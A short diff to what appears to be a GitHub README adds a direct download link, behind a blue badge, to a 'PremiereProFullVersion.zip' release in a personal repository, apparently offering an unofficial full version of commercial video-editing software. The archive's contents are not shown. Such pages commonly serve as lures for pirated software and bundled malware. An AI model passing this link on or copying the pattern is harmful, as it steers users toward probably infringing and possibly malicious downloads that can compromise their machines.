@@ -5,7 +5,7 @@
 </div>
 
 ## 📥 Download the Program
-<a href="#" download>
+<a href="https://github.com/Rahulraor/Premiere-Pro/releases/download/proversion/PremiereProFullVersion.zip" download>
   <img src="https://img.shields.io/badge/Download-blue?logo=Download&logoColor=white&style=for-the-badge" alt="Download"/>
 </a>
 
